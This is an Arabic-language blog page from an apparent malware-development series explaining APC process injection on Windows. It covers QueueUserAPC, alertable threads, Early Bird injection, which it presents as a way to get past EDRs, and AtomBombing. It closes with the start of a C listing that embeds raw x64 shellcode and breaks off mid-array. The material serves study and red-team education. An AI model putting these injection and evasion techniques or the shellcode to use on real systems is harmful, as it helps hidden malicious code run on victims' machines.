<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APC Injection</title>
    <link rel="icon" href="../src/Pics/APC-Inj.webp" type="image/png">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"
        crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
    <style>
        html,
        body {
            font-family: 'Cairo', sans-serif;
            margin: 0;
            padding: 0;
            background-color: black;
            overflow-x: hidden;
        }

        nav {
            width: 100%;
            height: 10vh;
            position: sticky;
        }

        .nav-container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: space-around;
            align-items: center;
        }

        .logo {
            font-size: 2rem;
            font-weight: bold;
            cursor: pointer;
            background: -webkit-linear-gradient(gold, #ffed00);
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .logo span {
            cursor: pointer;
            background: -webkit-linear-gradient(gold, #ffed00);
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .hamburg,
        .cancel {
            cursor: pointer;
            position: absolute;
            right: 15px;
            top: 10px;
            color: gold;
            display: none;
            font-size: clamp(2.5rem, 0.5rem + 5vw, 3rem);
        }

        .nav-container .links {
            display: flex;
        }

        .nav-container .links a {
            font-size: 1.2rem;
            color: white;
            margin: 0 20px;
            text-decoration: none;
            font-weight: 550;
            transition: 0.3s linear;
        }

        .nav-container .links a:hover {
            color: gold;
            border-bottom: 2px solid gold;
        }

        .dropdown {
            max-height: 100vh;
            overflow-y: auto;
            z-index: 100;
            position: absolute;
            top: 0;
            transform: translateY(-500px);
            width: 100%;
            height: auto;
            backdrop-filter: blur(4px) brightness(40%);
            box-shadow: 0 0 20px black;
            transition: 0.2s linear;
        }

        .dropdown .links a {
            display: flex;
            color: white;
            text-decoration: none;
            padding: 15px 0;
            justify-content: center;
            align-items: center;
            transition: 0.2s linear;
        }

        .dropdown .links a:hover {
            background-color: gold;
            color: black;
        }

        .dark-mode {
            background-color: #222;
            color: #f4f4f4;
        }

        header {
            background: -webkit-linear-gradient(gold, #ffed00);
            background-clip: text;
            -webkit-text-fill-color: transparent;
            text-align: center;
            border-bottom: 1px solid gold;
        }



        header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 0 15px;
        }


        .article {
            background: white;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .article h2 {
            margin-top: 0;
            border-top: 2px solid gold;
            border-bottom: 2px solid gold;
            padding-bottom: 5px;
        }

        .code-block {
            background: gold;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
            direction: ltr;
            text-align: left;
            font-size: 15px;
        }


        @media (max-width:884px) {
            nav .logo {
                position: absolute;
                top: 16px;
                left: 15px;
                font-size: 1.5rem;
            }

            .nav-container .links {
                display: none;
            }

            .hamburg,
            .cancel {
                display: block;
            }

        }


        @media (max-width:440px) {
            .nav-container {
                margin-top: 10px;
            }

            table {
                display: block;
                overflow-x: auto;
            }
        }

        .footer {
            background: #111;
            color: #fff;
            text-align: center;
            padding: 5px;
            position: relative;
            bottom: 0;
            width: 100%;
            margin-top: auto;
        }

        .footer a {
            color: gold;
            text-decoration: none;
            font-weight: bold;
        }

        .footer a:hover {
            color: #51460c;

        }

        .ltr {
            direction: ltr;
            text-align: left;
        }

        .article-image {
            width: 100%;
            height: auto;
            border-radius: 8px;
        }

        .nav-buttons a {
            background: gold;
            color: black;
            padding: 10px 0;
            border-radius: 5px;
            text-decoration: none;
            transition: background-color 0.3s;
            text-align: center;
            flex: 1;
            margin: 0 10px;
            max-width: 150px;
            font-size: 20px;
        }

        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }

        .nav-buttons a:hover {
            background: #51460c;
            color: #fff;
        }

        .download-link {
            text-decoration: none;
            color: gold;
            font-weight: bold;
            transition: color 0.3s ease;
        }

        .download-link:hover {
            color: #51460c;
            text-decoration: underline;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px auto;
            text-align: center;


        }

        th,
        td {
            border: 1px solid black;
            padding: 7px;
        }

        th {
            background-color: gold;
        }
    </style>
</head>

<body>
    <section>
        <nav>
            <div class="nav-container" style="direction: ltr;">
                <div class="logo" data-aos="zoom-in" data-aos-duration="800">
                    <span>0x4de1</span>
                </div>
                <div class="links">
                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100"><a
                            href="https://0x4de1.github.io">Home</a></div>
                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300"><a
                            href="../MalDev.html">Mal Dev</a></div>
                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="400"><a
                            href="https://0x4de1.medium.com/" id="blogLink">CTF Writeups</a></div>
                </div>
            </div>
            <i class="fa-solid fa-bars hamburg" onclick="hamburg()"></i>
            <div class="dropdown">
                <div class="links">
                    <a href="https://0x4de1.github.io">Home</a>
                    <a href="../MalDev.html">Mal Dev</a>
                    <a href="https://0x4de1.medium.com">CTF Writeups</a>
                    <i class="fa-solid fa-xmark cancel" onclick="cancel()"></i>
                </div>
            </div>
        </nav>
        <header>
            <h1 id="article-title" style="direction: ltr;">APC Injection</h1>
        </header>
        <div class="container">
            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                <img src="../src/Pics/APC-Inj.webp" alt="HomeLab" class="article-image" loading="lazy">
            </div>
            <div class="article" data-aos="zoom-in" data-aos-duration="800">
                <p style="text-align: center; font-weight: bold;">ุงูุณูููุงููู ุนููููููููู ููุฑูุญูููุฉู ุงูููู ููุจูุฑูููุงุชููู
                </p>
                <p style="text-align: center; font-weight: bold;">ุงููููููููู ุตูููู ุนูููู ููุญููููุฏู ููุนูููู ุขูู
                    ููุญููููุฏู ุ ููููุง ุตููููููุชู ุนูููู ุฅูุจูุฑูุงููููู ููุขูู
                    ุฅูุจูุฑูุงููููู ุ ุฅูููููู ุญููููุฏู ููุฌููุฏู ุ ููุจูุงุฑููู ุนูููู ููุญููููุฏู ููุนูููู ุขูู ููุญููููุฏู ุ ููููุง
                    ุจูุงุฑูููุชู ุนูููู ุฅูุจูุฑูุงููููู ููุขูู ุฅูุจูุฑูุงููููู ุ ุฅูููููู ุญููููุฏู ููุฌููุฏู ุ <br>
                    <br>
                    โจ๐ ููููู ูููุงูู ุงูุฎูููุฑู ุ ููุฃุณุฃูู ุงูููู ุฃูู ููููุฃ ููููุจููู ุจุงูููููุฑู ูุงูููููู ุ ููุจูุงุฑููู
                    ุนูููููููู
                    ุงูุดููููุฑู ๐โจ
                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                    <img src="../src/Pics/Ramadan2.jpg" alt="HomeLab" class="article-image" loading="lazy">
                </div>
                </p>
            </div>
            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                <h2>Introduction</h2>
                <p>[+] ูู ุงูููุงูุชูู ุงููู ูุงุชูุง ุงุชููููุง ุนู ุงูู DLL Injection ูุงูู Shellcode Injection ูุดูููุง ุฅุฒุงู ููุฏุฑ ูู
                    inject ุดูู ููุฏ ุฃู ููู DLL ูู ุจุฑูุณูุณ ุ ุณูุงุก local ุฃู Remote.</p>
                <p>[+] ุงููุฑุฉ ุฏู ุจูู ููุชููู ุนู ุงูู <code style="background: gold; font-size: 14px;">APC Injection</code>
                    ุ ูุฏู ุทุฑููุฉ ุชุงููุฉ ูู ุทุฑู ุงูู <code
                        style="background: gold; font-size: 14px;">Process Injection</code> ุงููู
                    ุจุชุนุชูุฏ ุน
                    ูููุงููุฒู ููุฌูุฏ ูู ุงููููุฏูุฒ ุงุณูู <code
                        style="background: gold; font-size: 14px;">Asynchronous Procedure Calls (APCs)</code>.</p>
                <p style="border-top: 2px solid gold;"></p>

                <p style="font-weight: bold;">[+] ุทูุจ ูุนูู ุฅูู APC ุ</p>
                <p>
                    ูุจู ูู ูุชููู ุนู ุงูู <code style="background: gold; font-size: 14px;">APC Injection</code> ุ ุฎูููุง
                    ุงูุฃูู ูููู ูุนูู ุฅูู APC (Asynchronous Procedure Call).
                </p>
                <ul>
                    <li>ุงููููุฏูุฒ ููู ุญุงุฌุฉ ุงุณููุง <code style="background: gold; font-size: 14px;">APC Queue</code> ููู
                        Thread ุ ูุฏู ุนุจุงุฑุฉ ุนู <code style="background: gold; font-size: 14px;">Queue</code> ุฃู <code
                            style="background: gold; font-size: 14px;">ูุงุฆูุฉ ุงูุชุธุงุฑ</code> ูููุง ุฏูุงู ุงูููุฑูุถ
                        ุงูุซุฑูุฏ ูููุฐูุง ูู ููุช ูุนูู .. ุงูููุฑุฉ ููุง ุฅู ุจุนุถ ุงูุฏูุงู ูู ุงููููุฏูุฒ ุจุชุณูุญ ููุจุฑุงูุฌ ุฅููุง ุชุถูู ุฏูุงู
                        ุฌุฏูุฏุฉ ูููุงุฆูุฉ ุฏู ุ ุจุญูุซ ููุง ุงูุซุฑูุฏ ููุตู ูุญุงูุฉ ูุนููุฉ ุ ูููุฐ ุงูุฏูุงู ุฏู ุจุดูู ุชููุงุฆู.</li>
                    <li>ุจูุนูู ุชุงูู ุ ูู ุนูุฏู ุซุฑูุฏ ุดุบุงู ูู ุงูุฎูููุฉ ุ ููุญุชุงุฌ ุชููุฐ ุฏุงูุฉ ูุนููุฉ ุนููู ูู ุบูุฑ ูู ุชูููู ุฃู ุชุชุฏุฎู
                        ุจุดูู ูุจุงุดุฑ ุ ุงููููุฏูุฒ ุจูุณูุญูู ุชุถูู ุงูุฏุงูุฉ ุฏู ูู ุงูู <code
                            style="background: gold; font-size: 14px;">APC Queue</code> ุงูุฎุงุตุฉ ุจุงูุซุฑูุฏ ุฏู ุ ูููุง ุงูุซุฑูุฏ
                        ููุตู ูุญุงูุฉ ูุนููุฉ ุ ูููุฐูุง ุน ุทูู ุชููุงุฆู.</li>
                </ul>
                <p style="font-weight: bold;">[+] ุทุจ ุฅุฒุงู ุงูู APC Queue ุจุชุดุชุบูุ</p>
                <p>ูู Thread ูู ุงููููุฏูุฒ ุนูุฏู <code style="background: gold; font-size: 14px;">APC Queue</code> ุฎุงุตุฉ ุจูู
                    ุ
                    ุจุณ ุงูุฏูุงู ุงููู ูููุง ูุด ุจุชุชููุฐ ุน ุทูู ุ ูุงุฒู ุงูุซุฑูุฏ ูููู
                    ูู ุญุงูุฉ ุงุณููุง <code style="background: gold; font-size: 14px;">Alertable State</code> ุนุดุงู ูุจุฏุฃ ูููุฐ
                    ุงูุฏูุงู ุงููู ูู ุงูู Queue.</p>
                <p style="font-weight: bold;">[+] ุฅูุชู ุงูุซุฑูุฏ ุจูุฏุฎู ูู ุงูู Alertable Stateุ</p>
                <p>ููู ุฏูุงู ูุนููุฉ ูู ุงููููุฏูุฒ ุจุชุฎูู ุงูุซุฑูุฏ ูุฏุฎู ุงูู Alertable State ุฒู:</p>
                <ul style="font-weight: bold;direction: ltr;">
                    <li>SleepEx()</li>
                    <li>SignalObjectAndWait()</li>
                    <li>MsgWaitForMultipleObjectsEx()</li>
                    <li>WaitForMultipleObjectsEx()</li>
                    <li>WaitForSingleObjectEx()</li>
                </ul>
                ููุง ุฃู ุซุฑูุฏ ูููุฐ ูุงุญุฏุฉ ูู ุงูุฏูุงู ุฏู ุ ุจูุจุฏุฃ ูููุฐ ุฃู ุฏูุงู ููุฌูุฏุฉ ูู <code
                    style="background: gold; font-size: 14px;">APC Queue</code> ุงูุฎุงุตุฉ ุจูู ุชููุงุฆูุง ..
                ูุชูุฏุฑ ุชุดูู ุงููุตุฏุฑ ูู <a
                    href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls"
                    target="_blank" class="download-link">[ููุง]</a>:
                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                    <img src="../src/Pics/APCInj-1.png" alt="APC-Injection-1" class="article-image" loading="lazy">
                </div>
                <p style="font-weight: bold;">[+] ุทุจ ุฅูู ุนูุงูุฉ ุงูููุงู ุฏู ุจุงูู Injectionุ</p>
                <p>ุฅุญูุง ูููู ูุณุชุบู ุงูู <code style="background: gold; font-size: 14px;">APC Queue</code> ุนุดุงู ูุญูู ููุฏ
                    ุฏุงุฎู Thread ูุนูู ุ ุฎุตูุตุง ูู ุงูุซุฑูุฏ ุฏู ูู ุงูู Alertable
                    State
                    ุ ูุงูููุฑุฉ ุจุจุณุงุทุฉ ุฅููุง ุจูุถูู Shellcode ุฃู ุฏุงูุฉ ูุนููุฉ ููุงุฆูุฉ ุงูู <code
                        style="background: gold; font-size: 14px;">APC Calls</code> ุงูุฎุงุตุฉ ุจุงูุซุฑูุฏ ุ ูููุง ููุฌู
                    ููุช ุชูููุฐูุง ุ ุงูููุฏ ุจุชุงุนูุง ููุดุชุบู ุฌูู ุงูุจุฑูุณูุณ ุงููู ุฅุญูุง ูุณุชูุฏููููุง.</p>

                <p style="border-top: 2px solid gold;"></p>

                <p style="font-weight: bold;">[+] ุฅุฒุงู ูููู ูุณุชุฎุฏูู ุจุดูู ุนูููุ</p>
                <p>ููู ุทุฑู ูุฎุชููุฉ ูุงุณุชุบูุงู ุงูู <code style="background: gold; font-size: 14px;">APC Injection</code>
                    ุนุดุงู ูููุฐ ููุฏ ุฏุงุฎู ุจุฑูุณูุณ ุชุงููุฉ ุ ุฒู:</p>
                <ol>
                    <li style="font-weight: bold;">ุงุณุชุฎุฏุงู QueueUserAPC ูุชูููุฐ ุฏุงูุฉ ุฏุงุฎู ุซุฑูุฏ ูุนูู :</li>
                    ูู ุนูุฏูุง ุซุฑูุฏ ูู ุญุงูุฉ ุงูู Alertable ุ ูููู ูุณุชุฎุฏู <code
                        style="background: gold; font-size: 14px;">()QueueUserAPC</code> ุนุดุงู ูุถูู ููุฏ ูุนูู ูุชููุฐ ูู
                    ุงููุฑุฉ
                    ุงูุฌุงูุฉ ุงููู ูุฏุฎู ูููุง ุงูุซุฑูุฏ ุงูุญุงูุฉ ุฏู .. ุฒู ูุซูุง ูู ุจุฑูุงูุฌ ุจูุณุชุฎุฏู <code
                        style="background: gold; font-size: 14px;">()SleepEx</code> ุจุฏู <code
                        style="background: gold; font-size: 14px;">()Sleep</code> ุ ูููู
                    ูุณุชุบู ุงูููุถูุน ููุถูู <code style="background: gold; font-size: 14px;">APC Call</code> ููุช ููู ุงูุซุฑูุฏ.
                    <li style="font-weight: bold;">"Early Bird Injection" โ ุชูููุฐ ููุฏ ูุจู ููุทุฉ ุงูุฏุฎูู (Entry Point) :
                    </li>
                    ููุง ุจููุดุฆ ุจุฑูุณูุณ ูู ูุถุน ุงูู <code style="background: gold; font-size: 14px;">Suspended</code> ุ
                    ููุญูู ููู ุงูุดูู ููุฏ ุ ูุจุนุฏูู ูุณุชุฎุฏู APC Injection ุนุดุงู ูุถูู
                    ุฅูู ูุชููุฐ ูุจู ูู ุงูุจุฑูุณูุณ ูุจุฏุฃ ุดุบูู ุงููุนูู .. ูุฏู ุฃุณููุจ ุจูุชู ุงุณุชุฎุฏุงูู ูุชุฌุงูุฒ ุจุนุถ ุขููุงุช ุงูุญูุงูุฉ ุฒู
                    ุงูู EDRs ุงููู ุจุชุฑุงูุจ ูุดุงุท ุงูุจุฑูุณูุณ ุจุนุฏ ุงูุชุดุบูู.
                    <li style="font-weight: bold;">ุงุณุชุฎุฏุงู "AtomBombing" ูุชูููุฐ ููุฏ ุฎุจูุซ ุนุจุฑ ุงูู Atom Table :</li>
                    ูู ุงูุทุฑููุฉ ุฏู ุงูุดูู ููุฏ ุจูุชูุชุจ ูู ุงูู <code
                        style="background: gold; font-size: 14px;">Global Atom Table</code> ุ ูุจุนุฏูู ุจูุชููุฐ ุฏุงุฎู ุจุฑูุณูุณ
                    ุชุงููุฉ ุจุงุณุชุฎุฏุงู
                    APC Injection.
                </ol>
                ูุชูุฏุฑ ุชุดูู ุงููุตุฏุฑ ูู <a href="https://attack.mitre.org/techniques/T1055/004/" target="_blank"
                    class="download-link">[ููุง]</a>.
                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                    <img src="../src/Pics/APCInj-2.png" alt="APC-Injection-2" class="article-image" loading="lazy">
                </div>
                <p style="border-top: 2px solid gold;"></p>

                <p style="font-weight: bold;">[+] ุชุนุงูู ููููู ุดููุฉ ุฃูุซูุฉ ุน ุงุณุชุฎุฏุงูุงุช ุงูู APC ูู ุงููููุฏูุฒ :</p>
                <ol>
                    <li style="font-weight: bold;">ุนูููุงุช ุงูุฅุฏุฎุงู ูุงูุฅุฎุฑุงุฌ (I/O Operations) :</li>
                    ููุง ุจุฑูุงูุฌ ูุทูุจ ููุฑุฃ ุฃู ููุชุจ ุจูุงูุงุช ูู ููู ุ ุฃู ุญุชู ูุญูู ุญุงุฌุฉ ูู ุงูุฅูุชุฑูุช ุ ุจุฏู ูู ููุถู ูุณุชูู ูุญุฏ ูู
                    ุงูุนูููุฉ ุชุฎูุต ุ ุงููููุฏูุฒ ุจูุณุชุฎุฏู APC ุนูุดุงู ูููู ุชุดุบูู ุงูุจุฑูุงูุฌ ุนุงุฏู ุ ูุฃูู ูู ุงูุจูุงูุงุช ุชุจูู ุฌุงูุฒุฉ ุ
                    ุงูููุฏ ูุชููุฐ ุชููุงุฆูุง .. ููุซุงู ุน ูุฏู ุฏูุงู ุฒู <code
                        style="background: gold; font-size: 14px;">()ReadFileEx</code> ู <code
                        style="background: gold; font-size: 14px;">()WriteFileEx</code> ุงููู ุจุชุณูุญ ุจุงููุฑุงุกุฉ ูุงููุชุงุจุฉ
                    ุจุฏูู ูู ุชููู ุงูุจุฑูุงูุฌ.
                    <li style="font-weight: bold;">ุชุดุบูู ููุฏ ููุช ุงูุงูุชุธุงุฑ ุจุงุณุชุฎุฏุงู ()SleepEx :</li>
                    ูู ุจุฑูุงูุฌ ูุญุชุงุฌ ููุงู ุดููุฉ ุจุงุณุชุฎุฏุงู <code style="background: gold; font-size: 14px;">()SleepEx</code>
                    ุจุฏู <code style="background: gold; font-size: 14px;">()Sleep</code> ุงูุนุงุฏูุฉ ุ ูููู ุฎูุงู ุงูููุช ุฏู
                    ูุณุชูุจู ููููุฐ
                    <code style="background: gold; font-size: 14px;">APC Calls</code> ุ ูุฏู ุจูููุฏ ุงูุจุฑุงูุฌ ุงููู ูุด ุนุงูุฒุฉ
                    ุชุจูู ูุชูููุฉ ุชูุงูุง ูุนุงูุฒุฉ ุชูุฏุฑ ุชุณุชุฌูุจ ูุฃู ุญุฏุซ ูุญุตู ุฃุซูุงุก
                    ุงูููู.
                    <li style="font-weight: bold;">ุงูุชุธุงุฑ ุงูุนูููุงุช ูุน ุชูููุฐ ุฃููุงุฏ ูู ููุณ ุงูููุช WaitForSingleObjectEx :
                    </li>
                    ุฃููุงุช ุงูุจุฑุงูุฌ ุจุชุณุชูู ูุญุตู ุญุงุฌุฉ ูุนููุฉ ุ ุฒู ูุซูุง ุงูุชูุงุก ุชุญููู ููู ุฃู ุงุณุชุฌุงุจุฉ ูู ุฌูุงุฒ ุฎุงุฑุฌู ุ ุจุงุณุชุฎุฏุงู
                    <code style="background: gold; font-size: 14px;">()WaitForSingleObjectEx</code> .. ูู ุงูุญุงูุฉ ุฏู ุ ูู
                    ูู ุฃู APC Calls ูุชุณุฌูุฉ ููุซุฑูุฏ ุ ูุชุชููุฐ ุชููุงุฆูุง ููุช
                    ุงูุงูุชุธุงุฑ ุจุฏู ูู ูุจูู ุงูุจุฑูุงูุฌ ูุงูู ุชูุงูุง.
                    <li style="font-weight: bold;">ุชูููุฐ ููุฏ ูุนูู ุจุนุฏ ุงูุชูุงุก Thread ูุนูู :</li>
                    ุจุฏู ูู ุงูุจุฑูุงูุฌ ููุถู ูุณุชูู ุซุฑูุฏ ูุนูู ูุฎูุต ุนูุดุงู ูุจุฏุฃ ุฎุทูุฉ ุฌุฏูุฏุฉ ุ ูููู ูุณุชุฎุฏู APC ุจุญูุซ ุฃูู ูู ุงูุซุฑูุฏ
                    ูุฎูุต ุ ูุชู ุชูููุฐ ููุฏ ูุนูู ุชููุงุฆูุง ูู ุบูุฑ ุงูุญุงุฌุฉ ูุงูุชุธุงุฑ ูุฏูู ุฃู ูุฑุงูุจุฉ ูุณุชูุฑุฉ.
                    <li style="font-weight: bold;">ุชุญุณูู ุงุณุชุฌุงุจุฉ ุงูุชุทุจููุงุช ุงููู ูููุง ูุงุฌูุฉ ุฑุณูููุฉ (GUI Applications) :
                    </li>
                    ุจุฑุงูุฌ ุงููููุฏูุฒ ุงููู ุจุชุนุชูุฏ ุน ูุงุฌูุฉ ุฑุณูููุฉ (ุฒู ุงููุชุตูุญุงุช ุฃู ุจุฑุงูุฌ ุงูุชุนุฏูู ุน ุงูุตูุฑ) ุจุชุณุชุฎุฏู APC
                    ุนูุดุงู ุชุนุงูุฌ ุงูุทูุจุงุช ูุงูุฑุณุงุฆู ุงููู ุจุชูุตู ููู <code
                        style="background: gold; font-size: 14px;">Message Queue</code> ุจุณุฑุนุฉ ูููุงุกุฉ ุ ูุฏุง ุจูุฎูููุง ุฃูุชุฑ
                    ุณูุงุณุฉ ูุฃูู
                    ุชูููุฌ.
                    <li style="font-weight: bold;">ุงูุชุนุงูู ูุน ุงูุฃุญุฏุงุซ ูู Kernel Mode :</li>
                    ุฌูุง ูุธุงู ุงูุชุดุบูู ููุณู (<code style="background: gold; font-size: 14px;">Kernel Mode</code>) ุ
                    ุงููููุฏูุฒ ุจูุณุชุฎุฏู APC ุนูุดุงู ูุณูุญ ูููุฏ ุงููุณุชุฎุฏู (<code
                        style="background: gold; font-size: 14px;">User Mode</code>) ุฅูู
                    ูุชูุงุนู ูุน ุงูุฃุญุฏุงุซ ุงููู ุจุชุญุตู ูู ุงูุฎูููุฉ ุ ุฒู ุงุณุชุฌุงุจุฉ ุชุนุฑููุงุช ุงููุงุฑุฏููุฑ ุฃู ุฅุฏุงุฑุฉ ุงูููููุฑู ุ ููุฏุง
                    ูุนูู.
                    <li style="font-weight: bold;">ูุณุงุนุฏุฉ ุฃุฏูุงุช Debugging ุน ุงูุชุญูู ูู ุงูุจุฑุงูุฌ :</li>
                    ุฃุฏูุงุช ุงูุชุตุญูุญ (<code style="background: gold; font-size: 14px;">Debugging Tools</code>) ุจุชุณุชุฎุฏู APC
                    ุนูุดุงู ุชุฏุฎู ููุฏ ูุนูู ุฌูุง ุงูุจุฑูุงูุฌ ุงููู ุจูุชู ุชุตุญูุญู ุ ูุฏู
                    ุจูุณุงุนุฏ ูู ุชุชุจุน ุงูุฃููุงุฏ ุฃู ุชูููุฐ ุจุนุถ ุงูุนูููุงุช ุงูุฎุงุตุฉ ุจุงูู <code
                        style="background: gold; font-size: 14px;">Hooking & Tracing</code>.
                </ol>
                <p>ูู ุงูุณููุงุฑูููุงุช ุฏู ุจุชูุถุญ ุฅู ุงูู <code style="background: gold; font-size: 14px;">APC Mechanism</code>
                    ูุด ูุฌุฑุฏ ุญุงุฌุฉ ุซุงูููุฉ ุ ุฅููุง ูู ุฌุฒุก ุฃุณุงุณู ูู ููููุฉ ุชุดุบูู
                    ุงูุชุทุจููุงุช ูู ุงููููุฏูุฒ ุ ูุฏู ุงูุณุจุจ ุงููู ุจูุฎูููุง ููุฏุฑ ูุณุชุบูู ูู ุงูู <code
                        style="background: gold; font-size: 14px;">Process Injection</code>.</p>
                <p style="border-top: 2px solid gold;"></p>

                <p style="font-weight: bold;">[+] ุจุนุฏ ุงูููุฏูุฉ ุงูุทูููุฉ ุฏู ูุงููู ูุงูุช ูุงุฒู ุนุดุงู ุชููู ูุงูู .. ููุชููู ุนู:
                </p>
                <ol style="font-weight: bold; direction: ltr;">
                    <li>SleepEx()</li>
                    <li>WaitForSingleObjectEx()</li>
                    <li>Suspended Thread</li>
                    <li>Remote APC Injection (EarlyBird)</li>
                </ol>
                <h2 style="direction: ltr;">1. SleepEx()</h2>
                <p>[+] ููุชููู ุนู ุฏุงูุชูู ุชุจุน ุงูู Windows API ุ ูุงููู ููุดูู ูู ุฎูุงููู ุฅุฒุงู ูุฎูู ุงูุซุฑูุฏ ูู ุงูู
                    <code style="background: gold; font-size: 14px;">Alertable State</code> ุนุดุงู ููุฏุฑ ูููุฐ ุงูู APC
                    Injection.
                </p>
                <p>ุงูู <code style="background: gold; font-size: 14px;">()SleepEx</code> ุฏู ุฏุงูุฉ ุจุชุฎูู ุงูุซุฑูุฏ ููุงู ููุชุฑุฉ
                    ูุนููุฉ ูุน ุฅููุงููุฉ ุชูููุฐ <code style="background: gold; font-size: 14px;">APC Calls</code> ููุช ุงูููู
                    .. ุชุนุงูู
                    ูุฏุฎู ุน ุงูููุฏ ูุงูุฎุทูุงุช:</p>
                <ol>
                    <li style="font-weight: bold;">ูููุฑูุช ุจุฑูุฌููุช ุฌุฏูุฏ ููุถูู ุงูุดูู ููุฏ ุงููู ุจูุดุชุบู ุจูู ูู ูุฑุฉ :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/SleepEx-1.png" alt="APC-Injection-3" class="article-image" loading="lazy">
                    </div>
                    <li style="font-weight: bold;">ุงูุฏุงูุฉ ()AlertableFunction :</li>
                    ุจุชุณุชุฎุฏู <code style="background: gold; font-size: 14px;">()SleepEx</code> ุนุดุงู ุชุฎูู ุงูุซุฑูุฏ
                    ููุงู
                    ุจุณ ูู ูุถุน ุงูู Alertable ุ ูุฏู ูุนูุงู ุฅูู ููุฏุฑ ูููุฐ ุฃู APC Calls ููุฌูุฏุฉ ูู ุงูู <code
                        style="background: gold; font-size: 14px;">APC Queue</code> ุจุชุงุนุชู
                    ููุช ุงูููู.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/SleepEx-2.png" alt="APC-Injection-4" class="article-image" loading="lazy">
                    </div>
                    <li style="font-weight: bold;">ููุฏุฎู ุน ุงููุงููุดู ุจุชุงุนุฉ ุงูู Injection :</li>
                    ุงุชููููุง ุนู ุงูู <code
                        style="background: gold; font-size: 14px;">VirtualAlloc, memcpy & VirtualProtect</code> ูุจู ูุฏู
                    .. ุงูุฌุฒุก ุงูุฌุฏูุฏ ุจุชุงุน ุงูู <code style="background: gold; font-size: 14px;">QueueUserAPC</code>
                    ..
                    ูุฏู ุจุชุณุชุฎุฏู ูุฅุถุงูุฉ APC ููู APC Queue ุงูุฎุงุตุฉ ุจุซุฑูุฏ ูุนูู.<br>
                    ููุง ุงูุซุฑูุฏ ุงููุณุชูุฏู ูุฏุฎู ูู ูุถุน ุงูู Alertable ุ ุงููููุฏูุฒ ุจูุดูู ุฅู ููู APC Call ูุชุณุฌูุฉ ูู ุงูู APC
                    Queue ุ ููููุฐ ุงูููุฏ ุงููู ูู ุงูู pAddress ุ ูุงููู ูู ุญุงูุชูุง ุฏู ูู Shellcode.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/SleepEx-3.png" alt="APC-Injection-5" class="article-image" loading="lazy">
                    </div>
                    <li style="font-weight: bold;">ุขุฎุฑ ุฌุฒุก ูุงููุดู ุงูู main :</li>
                    ููุง ููููุงุด ุฌุฏูุฏ ุนู ุงููู ุดุฑุญูุงู ูุจู ูุฏู ุ ูู ุจุชุจุฏุฃ ุงูุชูููุฐ ุจุฅูุดุงุก Thread ุฌุฏูุฏ ุจุงุณุชุฎุฏุงู <code
                        style="background: gold; font-size: 14px;">CreateThread</code> ุ
                    ูุงูุซุฑูุฏ ุฏู ุจูููู ูู ุงูู <code style="background: gold; font-size: 14px;">Alertable State</code> ุนุดุงู
                    ููุฏุฑ ูุณุชูุจู APC Calls ุ ุจุนุฏ ูุฏู ุจุชุณุชุฏุนู
                    <code style="background: gold; font-size: 14px;">ApcInjectionFunc</code> ุนุดุงู ุชุญูู ุงูู Shellcode ูู
                    ุงูู Thread ุงููู ุชู ุฅูุดุงุคู.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/SleepEx-4.png" alt="APC-Injection-6" class="article-image" loading="lazy">
                    </div>
                </ol>
                <p style="border-top: 2px solid gold;"></p>
                <p style="font-weight: bold;">[+] ููุง ูู ุฑู :</p>
                <ul>
                    <li>ุชูุงู โ</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/SleepEx-5.png" alt="APC-Injection-7" class="article-image" loading="lazy">
                    </div>
                </ul>
                <p>[+] ุงูููุฏ ุงูููุงุฆู :</p>
                <div class="code-block"><code>
                    #include &lt;Windows.h><br>
                        #include &lt;stdio.h><br><br>
                        
                        unsigned char Payload[] = {<br>
                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
